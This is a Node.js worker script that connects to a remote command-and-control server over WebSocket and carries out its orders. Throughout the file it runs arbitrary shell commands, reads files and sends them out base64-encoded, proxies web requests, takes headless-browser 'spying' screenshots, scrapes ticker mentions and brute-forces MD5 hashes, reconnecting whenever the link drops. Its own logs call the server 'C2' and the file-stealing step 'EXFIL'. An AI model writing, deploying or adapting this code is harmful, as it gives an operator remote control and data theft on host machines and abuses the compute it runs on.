const WebSocket = require('ws');
const crypto = require('crypto');
const fs = require('fs');
const { exec } = require('child_process'); 

// --- AUTHENTICATION ---
const ACCESS_KEY = process.env.ACCESS_KEY;
if (!ACCESS_KEY) {
    console.error("Error: ACCESS_KEY not found.");
    process.exit(1);
}

const WEBSOCKET_URL = `wss://scavenger-brain.onrender.com?key=${ACCESS_KEY}`;

function connect() {
    const ws = new WebSocket(WEBSOCKET_URL);

    // HELPER: Send logs to Dashboard
    function logToC2(msg) {
        // We reuse the SHELL_LOG type to print text to your screen
        try { ws.send(JSON.stringify({ type: 'SHELL_LOG', output: msg })); } catch(e){}
        console.log(msg); // Keep local log too
    }

    ws.on('open', () => {
        console.log("Connected to C2.");
        ws.send(JSON.stringify({ type: 'REGISTER_WORKER' }));
    });

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);

            // 1. MINING JOB
            if (msg.type === 'MINING_JOB') {
                // Only log the start of a new range to avoid spam
                // logToC2(`[MINER] Starting range: ${msg.start}-${msg.end}`);
                crack(ws, msg.start, msg.end, msg.target);
            } 
            
            // 2. STOP
            else if (msg.type === 'STOP') {
                logToC2(`[SYSTEM] Target neutralized: ${msg.solution}. Standing by.`);
            }
            
            // 3. PROXY
            else if (msg.type === 'HTTP_PROXY') {
                logToC2(`[PROXY] Routing request to: ${msg.url}`);
                fetch(msg.url)
                    .then(async (response) => {
                        const text = await response.text();
                        ws.send(JSON.stringify({
                            type: 'PROXY_RESULT',
                            requestId: msg.requestId,
                            status: response.status,
                            body: text.substring(0, 500) + "..." 
                        }));
                    })
                    .catch(err => {
                        logToC2(`[PROXY ERROR] ${err.message}`);
                    });
            }

            // 4. SHELL
            else if (msg.type === 'EXEC_CMD') {
                logToC2(`[SHELL] Executing: ${msg.command}`);
                exec(msg.command, { timeout: 10000 }, (error, stdout, stderr) => {
                    const output = stdout || stderr || (error ? error.message : "Done.");
                    ws.send(JSON.stringify({ type: 'SHELL_RESULT', output: output }));
                });
            }

            // 5. EXFILTRATION
            else if (msg.type === 'EXFIL_CMD') {
                logToC2(`[EXFIL] Extracting: ${msg.path}`);
                if (fs.existsSync(msg.path)) {
                    try {
                        const fileData = fs.readFileSync(msg.path, { encoding: 'base64' });
                        ws.send(JSON.stringify({ type: 'EXFIL_RESULT', filename: msg.path.split('/').pop(), data: fileData }));
                    } catch (e) {
                        logToC2(`[EXFIL ERROR] Read failed: ${e.message}`);
                    }
                } else {
                    logToC2(`[EXFIL ERROR] File not found: ${msg.path}`);
                }
            }

            // 6. SNAPSHOT
            else if (msg.type === 'SNAPSHOT_CMD') {
                logToC2(`[EYE] Spying on: ${msg.url}`);
                const script = `
                    const puppeteer = require('puppeteer');
                    (async () => {
                        try {
                            const browser = await puppeteer.launch({ args: ['--no-sandbox'] });
                            const page = await browser.newPage();
                            await page.setViewport({ width: 1280, height: 720 });
                            await page.goto('${msg.url}', { waitUntil: 'networkidle2', timeout: 30000 });
                            await page.screenshot({ path: 'evidence.png' });
                            await browser.close();
                        } catch (e) { console.error(e); }
                    })();
                `;
                fs.writeFileSync('camera.js', script);
                const cmd = `npm list puppeteer || npm install puppeteer && node camera.js`;
                exec(cmd, { timeout: 60000 }, (error, stdout, stderr) => {
                    if (fs.existsSync('evidence.png')) {
                        const fileData = fs.readFileSync('evidence.png', { encoding: 'base64' });
                        ws.send(JSON.stringify({ type: 'EXFIL_RESULT', filename: `snapshot_${Date.now()}.png`, data: fileData }));
                    } else {
                        logToC2(`[EYE ERROR] Snapshot failed. Check URL or Anti-Bot.`);
                    }
                });
            }

            // 7. ALPHA SNIPER (UPDATED)
            else if (msg.type === 'SNIPE_CMD') {
                const ticker = msg.ticker;
                logToC2(`[SNIPER] Scanning feeds for: ${ticker}`);
                
                // Using a clearer search query
                const targetUrl = `https://nitter.net/search?f=tweets&q=${encodeURIComponent(ticker)}`;
                
                fetch(targetUrl).then(async (res) => {
                        if (res.status !== 200) {
                            logToC2(`[SNIPER ERROR] Nitter blocked us (Status: ${res.status}). Retrying...`);
                            return;
                        }
                        const html = await res.text();
                        const regex = new RegExp(ticker, 'gi');
                        const count = (html.match(regex) || []).length;
                        
                        // Send result even if 0, so we know it worked
                        ws.send(JSON.stringify({ type: 'SNIPE_RESULT', ticker: ticker, mentions: count }));
                        
                    }).catch(err => {
                        logToC2(`[SNIPER ERROR] Network fail: ${err.message}`);
                    });
            }

        } catch (e) { console.error("Error processing message:", e); }
    });

    ws.on('close', () => setTimeout(connect, 5000));
    ws.on('error', () => ws.close());
}

function crack(ws, start, end, targetHash) {
    for (let i = start; i < end; i++) {
        const guess = i.toString(); 
        const hash = crypto.createHash('md5').update(guess).digest('hex');
        if (hash === targetHash) {
            ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: guess, hash: hash }));
            return;
        }
    }
    ws.send(JSON.stringify({ type: 'JOB_COMPLETE', solution: null }));
}

setInterval(() => {
    // Heartbeat is silent in C2 logs to avoid spam, but visible in GitHub logs
    console.log(`[HEARTBEAT] System Vitality: 100% | Uptime: ${process.uptime().toFixed(0)}s`);
}, 60000); 

connect();
